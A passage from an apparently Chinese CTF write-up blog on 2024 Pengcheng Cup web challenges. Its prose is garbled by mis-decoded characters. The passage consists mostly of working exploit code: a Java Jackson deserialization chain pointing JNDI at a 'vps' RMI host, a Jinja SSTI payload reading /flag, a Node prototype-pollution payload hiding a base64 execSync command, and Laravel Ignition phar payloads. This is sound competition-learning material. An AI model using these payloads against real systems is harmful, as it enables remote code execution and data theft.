class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Read the base64 encoded content from the file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lic.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    base64_content = file.read()<br><br><span class="hljs-comment"># Decode the base64 content to binary</span><br>binary_content = base64.b64decode(base64_content)<br><br><span class="hljs-comment"># Write the binary content to the output file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lic.so&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(binary_content)<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ç”¨iconvè„šæœ¬æ‰“ï¼Œå†ä¼ å‚payloadï¼Œå·²ç»å¯ä»¥RCEäº†ï¼š</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/c526ece5b759f7c91dca42c22d32f144.png" alt="img"></p><p>èšå‰‘è¿æ¥ï¼Œè¯»readflagï¼š</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/f02b1b974002e22cf8dcbbf9be691a79.png" alt="img"></p><h2 id="LookUP"><a href="#LookUP" class="headerlink" title="LookUP"></a>LookUP</h2><p>äºŒæ¬¡ååºåˆ—åŒ–ç”¨Jacksoné“¾æ‰“JNDIï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.backdoor.classes.hello;<br><span class="hljs-keyword">import</span> com.backdoor.classes.look;<br><span class="hljs-keyword">import</span> com.backdoor.util.MyInputstream;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.backdoor.classes.hello&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        f.set(o,<span class="hljs-string">&quot;rmi://vps:1099/akmaoy&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;;<br><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        hashSet.add(o);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashSet, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bad</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz1</span> <span class="hljs-operator">=</span> bad.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> clazz1.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(bad,pojoNode);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b1);<br>        o1.writeObject(bad);<br>        o1.close();<br><br>        System.out.println(Base64.getEncoder().encodeToString(b1.toByteArray()));<br><br><span class="hljs-comment">//        ByteArrayInputStream b2 = new ByteArrayInputStream(b1.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream o2 = new MyInputstream(b2);</span><br><span class="hljs-comment">//        o2.readObject();</span><br><span class="hljs-comment">//        o2.close();</span><br><br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241113201326361.png" alt="image-20241113201326361"></p><h2 id="pythonå£ç®—"><a href="#pythonå£ç®—" class="headerlink" title="pythonå£ç®—"></a>pythonå£ç®—</h2><p>é¦–å…ˆç”¨è„šæœ¬ç®—å‡ºç­”æ¡ˆæäº¤ï¼Œå¾—åˆ°hintï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">solved=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> current_expr<br><br>    <span class="hljs-comment"># å‰ç«¯è®¡ç®—</span><br>    .....<br>    .....<br>    <span class="hljs-comment"># é€šè¿‡è®¡ç®—</span><br><br>    username = <span class="hljs-string">&#x27;ctfer!&#x27;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>):<br>        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        <span class="hljs-keyword">if</span> whitelist_filter(username,whitelist_patterns):<br>            <span class="hljs-keyword">if</span> blacklist_filter(username):<br>                <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;filtered&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ä½ è¿‡å…³ï¼&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;filtered&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="hljs-string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹è„šæœ¬ç›´æ¥æ‰“SSTIã€‚</p><p>å¥½åƒwafå°±è¿‡æ»¤äº†æˆ‘payloadä¸­çš„ç©ºæ ¼ï¼Œè¿‡æ»¤å°‘äº†ï¼Œç›´æ¥å°±å‡ºäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_expression</span>(<span class="hljs-params">url</span>):<br>    response = requests.get(url)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> response.text.strip()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to fetch expression. Status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_and_submit</span>(<span class="hljs-params">expression, submit_url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        result = <span class="hljs-built_in">eval</span>(expression)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error evaluating expression: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    payload = <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat$&#123;IFS&#125;/flag&#x27;).read()&#125;&#125;&quot;</span><br>    response = requests.post(url=submit_url + <span class="hljs-string">f&quot;?&amp;answer=<span class="hljs-subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot;</span>, data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: payload&#125;)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Successfully sent the answer.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to send the answer. Status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># URL to fetch the expression</span><br>url = <span class="hljs-string">&quot;http://192.168.18.28/calc&quot;</span><br><br><span class="hljs-comment"># Fetch the expression</span><br>expression = fetch_expression(url)<br><span class="hljs-keyword">if</span> expression:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Fetched expression: <span class="hljs-subst">&#123;expression&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># URL to submit the result</span><br>    submit_url = <span class="hljs-string">&quot;http://192.168.18.28/&quot;</span><br>    calculate_and_submit(expression, submit_url)<br></code></pre></td></tr></table></figure><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109123947868.png" alt="image-20241109123947868"></p><h2 id="notadmin"><a href="#notadmin" class="headerlink" title="notadmin"></a>notadmin</h2><p>å®¡è®¡æºç å‘ç°mergeé€»è¾‘ï¼Œæƒ³åˆ°åŸå‹é“¾æ±¡æŸ“ï¼Œå…ˆæ±¡æŸ“secretKeyï¼Œç„¶åæœ¬åœ°åˆ¶ä½œä¸€ä¸ªtokenï¼Œç„¶åå†æ‰“codeçš„åŸå‹é“¾æ±¡æŸ“æ‰§è¡Œä»£ç ï¼Œç”±äºblacklisté‡Œ + è¢«banäº†ï¼Œæ‰€ä»¥base64å‡­å€Ÿç»•è¿‡çš„æ—¶å€™ä¹Ÿéœ€è¦è€ƒè™‘ç¼–ç é‡Œæœ‰æ— åŠ å·ã€‚</p><p>æœ¬åœ°åˆ¶ä½œusernameä¸ºadminå’Œkeyä¸ºadminçš„jwtï¼š</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109154211359.png" alt="image-20241109154211359"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">res = requests.post(url+<span class="hljs-string">&quot;/login&quot;</span>, json=&#123;<br>    <span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjYXQgLyogPj4vYXBwL3ZpZXdzL2xvZ2luLmVqcyIp`,`bas`.concat(`e64`)).toString())&quot;</span>,<br>        <span class="hljs-string">&quot;secretKey&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>base64ä¸­çš„å‘½ä»¤ä¸ºï¼š</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109154523192.png" alt="image-20241109154523192"></p><p>ç„¶åå¸¦tokenè®¿é—®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">res = requests.get(url, headers=&#123;<span class="hljs-string">&quot;authorization&quot;</span>:<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzMxMTM4MTIwfQ.xhWbYZSufvhAnxhOdLPORZCJ05F9HSmuQUHV9tzw364&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è®¿é—®æ±¡æŸ“secretKeyï¼Œç¬¬äºŒæ¬¡è®¿é—®å¸¦tokenæ‰§è¡Œcodeï¼Œå°†æ ¹ç›®å½•æ–‡ä»¶å†™å…¥&#x2F;app&#x2F;views&#x2F;login.ejså‰ç«¯æ–‡ä»¶ï¼Œç„¶åç½‘é¡µæŸ¥çœ‹ï¼Œå·²ç»æœ‰flagäº†ï¼š</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109154711254.png" alt="image-20241109154711254"></p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109154722012.png" alt="image-20241109154722012"></p><h2 id="ezlaravel"><a href="#ezlaravel" class="headerlink" title="ezlaravel"></a>ezlaravel</h2><p>ç”¨Laravelè‡ªå¸¦çš„Ignition ç»„ä»¶å¯¹file_get_contents()å’Œfile_put_contents()å‡½æ•°æ„é€ æ¶æ„Logæ–‡ä»¶è§¦å‘Pharååºåˆ—åŒ–</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AA&quot;</span><br> <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;solution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;variableName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;username&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;viewFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=2B=00=41=00=67=00=41=00=41=00=41=00=51=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=49=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=54=00=49=00=36=00=49=00=6A=00=77=00=2F=00=63=00=47=00=68=00=77=00=49=00=47=00=5A=00=70=00=62=00=47=00=56=00=66=00=63=00=48=00=56=00=30=00=58=00=32=00=4E=00=76=00=62=00=6E=00=52=00=6C=00=62=00=6E=00=52=00=7A=00=4B=00=43=00=64=00=6B=00=62=00=33=00=55=00=7A=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=63=00=73=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6B=00=5A=00=57=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=4A=00=31=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=54=00=4A=00=4F=00=61=00=6C=00=6B=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6C=00=57=00=45=00=34=00=77=00=57=00=6C=00=63=00=77=00=62=00=30=00=6C=00=74=00=65=00=48=00=70=00=4A=00=51=00=7A=00=68=00=70=00=53=00=31=00=52=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=33=00=68=00=4E=00=61=00=6B=00=35=00=6B=00=53=00=31=00=52=00=30=00=64=00=32=00=46=00=49=00=51=00=6E=00=42=00=69=00=62=00=56=00=7